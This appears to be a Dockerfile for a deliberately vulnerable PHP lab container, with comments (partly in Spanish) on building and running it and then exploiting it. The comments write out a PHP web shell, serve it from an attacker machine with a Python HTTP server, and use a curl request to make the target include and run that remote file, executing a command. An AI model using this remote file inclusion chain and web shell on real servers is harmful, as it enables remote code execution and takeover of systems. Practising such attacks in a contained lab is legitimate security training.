FROM php:7.4-apache
COPY vulnerable.php /var/www/html/index.php

#docker build -t vulnerable-php .
#docker run -d -p 8080:80 vulnerable-php

#para explotarlo
#echo "<?php system(\$_GET['cmd']); ?>" > evil.php
#python3 -m http.server 8000
#curl "http://<docker-host>:8080/?file=http://<kali-ip>:8000/evil.php&cmd=whoami"
